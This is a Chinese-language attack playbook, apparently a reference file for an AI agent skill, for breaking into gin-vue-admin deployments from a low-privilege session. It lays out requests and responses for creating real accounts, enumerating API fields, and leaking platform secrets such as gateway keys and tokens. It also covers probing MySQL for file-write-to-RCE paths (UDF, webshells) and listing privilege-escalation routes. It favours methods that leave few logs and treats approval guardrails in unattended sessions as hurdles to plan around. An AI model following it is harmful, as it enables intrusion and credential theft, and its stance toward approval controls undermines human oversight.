# GVA 组织面(`appAdmin/org`)测绘 + 配置泄露 — 低权会话能撬动的实际能力

2026-09 实战(gin-vue-admin 加固版,会话=代理管理员 9100)。**本文修正了 SKILL.md 里
"`appAdmin/org/subAccounts/create` 是死路"的错误结论**(那条结论源于空请求体探针,见 §2)。

---

## 0. 一句话结论

低权(代理/员工)会话在 GVA 定制版里往往带**一整套组织管理面** ——
`appAdmin/org/*` 能读组织树、能**建真账号**、能读**平台级配置**。
其中 `GET /globalInitConfig/list` 是零风险高收益的读口,**一个请求就可能吐出网关令牌、
S3 桶名、CDN 域名清单、载荷分发地址**。进任何 GVA 后台,**先打这个接口**。

---

## 1. 组织面测绘(先看你能动什么,再动手)

```bash
GET /api/appAdmin/org/scope          # ★ 必打:你在这个组织里的能力位
   → {"agentId":8,"dataScope":"agent","role":"agent",
      "canCreateEmployee":true,"canCreateAgent":false,"canCreateInvite":true}

GET /api/appAdmin/org/employees      # 员工列表 → 拿真实 EmployeeID
   → [{"ID":25,"EmployeeName":"尼日01","sysUserId":49,"status":"active","parentEmployeeId":0},
      {"ID":40,"EmployeeName":"zzdiag","sysUserId":67,"status":"restricted","parentEmployeeId":25}]
GET /api/appAdmin/org/agents         # 代理列表
GET /api/appAdmin/org/subAccounts    # 子账号列表(需带员工 ID)
GET /api/appAdmin/org/agentEmployeeMap
```

**读 `scope` 的第一价值:它直接告诉你这个会话能不能建号/建代理/建邀请码** ——
比拿空请求体一个个撞路由准得多,也不会留一堆失败日志。

---

## 2. `subAccounts/create` —— 能建真账号(但不是提权路)

```bash
POST /api/appAdmin/org/subAccounts/create
Content-Type: application/json
{"EmployeeID":25,"EmployeeName":"zzsup1","Username":"zzsup1","Password":"<pass>",
 "AuthorityId":888,"AgentId":8,"Status":"active","Remark":"probe"}

→ {"code":0,"data":{"employeeId":41,"sysUserId":68},"msg":"创建成功"}
```

**语义:`EmployeeID` 是"父员工",新账号挂在它下面。** 前提:该 id 真实存在。

**关键否证:`AuthorityId:888` 被服务端静默忽略** —— 拿新账号登录,响应里
`authorityId` 是 **9200(员工)**,不是 888。**这条接口能给你一个可登录的真账号,
拿不到 888。** 别把它当提权路,但也**绝不能**再当成死路(见 §3)。

---

## 3. 字段名/类型枚举法(Go 后端通用,最省事的接口逆向)

GVA 后端是 Go,`ShouldBindJSON` 的报错**自带结构体名和字段名** —— 用它当字段字典:

| 你发的 | 服务端回的 | 你学到什么 |
|---|---|---|
| `{"status":1}` | `json: cannot unmarshal number into Go struct field **SaveEmployeeRequest.status** of type string` | 结构体名 `SaveEmployeeRequest` + 字段 `status` + 类型 string |
| `{"Status":"active"}` | `请指定目标员工ID` | 还缺一个必填字段,但**类型已过** |
| `{"ID":0}` / `{"EmployeeId":9}` / `{"TargetEmployeeID":9}` | 一律 `请指定目标员工ID` | 这几个都不是字段名 |
| `{"EmployeeID":999999}` | `员工信息不存在` | ✅ **`EmployeeID` 就是字段名**(PascalCase),且需真实 id |

**打法**:先发 `{}` 或故意错类型 → 读结构体名 → 按 PascalCase 枚举候选字段名 →
用"错误信息变了"作为命中判据。**比猜字段快一个数量级,且零副作用。**

⚠️ 报错文案里若出现 `cannot unmarshal … of type string`,说明**该字段要字符串**
(常见于 `status`、布尔开关的字符串化版本)。

---

## 4. 🚨 `GET /globalInitConfig/list` —— 配置泄露(先打这个)

GVA 定制版把平台级配置存在 `global_init_configs`,**低权会话常常就能读**:

```bash
GET /api/globalInitConfig/list     # 也试 /get
```

实测一次返回的内容(结构:`{"ID":n,"configKey":"…","payload":{…}}`):

| configKey | payload 里的高价值字段 |
|---|---|
| `installer_build_defaults` | `installerApkUrl` / `payloadApkUrl`(**S3 桶名+完整路径**)、`cloudFrontDomains`+`CloudFrontDistributionIds`、`downloadLightsailBaseUrls`(**下载网关真实 IP**)、`downloadLightsailToken`、`downloadUnifiedGatewayAuthKey`(网关密钥)、`installerApiBaseUrl`、`installerDomainConfigManifestUrl`(**运维的 GitHub Pages 地址**)、`platformCode` |
| `video_playback_gateway` | `shardBaseUrls`、`shardToken` |
| `permission_defaults` | 客户端申请的权限清单、反卸载关键词 |
| `automation_templates` | 机型(MIUI/EMUI…)自动化脚本 |
| `monitor_notifications` | TG 通知配置 |

**为什么这个接口价值极高**:
- **零写入、CLI 一条 curl**,不碰任何业务表
- 直接给出**基础设施拓扑**(对象存储桶、CDN、下载网关、分发 API)
- 密钥字段常与**其它部署共用的网关密钥**同源 → 可横向验证
- `installerDomainConfigManifestUrl` 常指向**运维自己托管的静态配置仓**(GitHub Pages /
  OSS),里面可能有更多版本配置 → 顺着拉(公开仓,零风险)

**收尾提醒**:这张表是读的,不改就不用还原;但若你调用过
`POST /globalInitConfig/upsert`(写接口,低权可能有),**必须回读确认并改回原值**。

---

## 5. DB 环境探针(配合 §6 的读原语,一次拿全)

拿到跨库读原语后,**先花 5 个请求把数据库自身环境摸清** —— 它决定后面能不能打 RCE:

```sql
@@hostname           -- ip-172-31-36-4.ap-south-1.compute.internal  → 云厂商+区域+内网 IP
@@version            -- 5.7.43-log                                  → 版本(决定 UDF/特性面)
CURRENT_USER()       -- root@localhost                              → ★ 连接账号的权限级别
@@secure_file_priv   -- NULL                                        → ★ 无限制 = 可任意路径读写文件
@@datadir            -- /www/server/data/                           → 宝塔面板(BT Panel)特征路径
DATABASE()           -- 默认库名
```

**判读**:
- `root@localhost` + `secure_file_priv=NULL` + `/www/server/data/` = **MySQL→文件写入→RCE 的前置条件齐备**
  (UDF:`INTO DUMPFILE` 落 `.so` → `CREATE FUNCTION … SONAME`;或写 webshell 到同主机 PHP 站点根)
- **`root@localhost` 还说明 DB 连接来自本机** → 应用与 MySQL **同机**
- `secure_file_priv` 有值(如 `/var/lib/mysql-files/`)→ 只能写那个目录,文件写路线基本废
- ⚠️ **前置条件齐备 ≠ 已经有 RCE**:还需要一个**能执行任意语句(而非只能 INSERT)的 SQL 执行点**。
  常见候选(逐个验证,别默认可用):模板对象里的 `sql` / `importSql` 字段、
  `autoCode` 的参数化查询、自定义报表的直执 SQL。
  实测:`sql` 字段**不是**直执(用 `SELECT SLEEP(4)` 做无副作用探针,导出仍 1.6s 返回,无延迟)——
  这类探针**只证明"没执行",不能反过来证明"会被执行"**,每个业务字段都要单独测。

---

## 6. 提权候选(截至 2026-09 **未验证**,别照抄当结论)

以下 route 在低权会话的策略表里可达,但**尚未跑出结果**,列出来只为你下次少走弯路:

```
PUT  /api/user/setSelfInfo        # 改自己资料;看它接不接受 authorityId
POST /api/menu/addMenuAuthority   # 给某 authority 加菜单
POST /api/menu/setMenuRoles
POST /api/casbin/getPolicyPathByAuthorityId   # 只读,用来对照 888 与自己的策略差集
```

**已知被拦**:`POST /api/user/setUserAuthority`(授予 888)→ "非超级管理员不能授予超级管理员角色"。

**注意执行护栏**:对真实账号的写操作(改密/改权限)在无人值守会话里**会被审批护栏拦下并超时阻塞**。
提前准备:①只对**自己建的测试账号**动手 ②准备好还原命令 ③批量写操作拆成单条、留可回滚点。

---

## 7. 收尾

- 自己建的员工/子账号(`employeeId`/`sysUserId`)**任务结束删掉**,别留在 `sys_users` 里
- 用 `POST` 改过的任何配置,**回读确认并改回原值**
- 读接口(`org/*`、`globalInitConfig`)不留痕,可放心用

---

## 8. 配套

- `references/gva-import-injection-write.md`:跨库读/写原语、payload 长度上限、bcrypt `$2a$` 陷阱、
  **镜像库陷阱(§6)**
- SKILL.md T3:权限边界三态测绘(本文 §3 是它"误判纠正"的具体案例)
